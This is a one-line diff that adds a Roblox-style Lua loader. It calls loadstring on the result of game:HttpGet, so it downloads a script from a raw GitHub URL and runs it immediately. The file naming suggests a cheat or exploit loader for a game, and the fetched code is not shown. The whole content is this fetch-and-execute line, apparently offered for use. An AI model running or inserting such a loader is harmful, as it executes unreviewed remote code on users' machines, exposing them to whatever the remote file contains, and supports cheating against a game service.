@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/pt-2-build-the-pyramid-spam0-6zy59c0co2g3ru.lua"))()
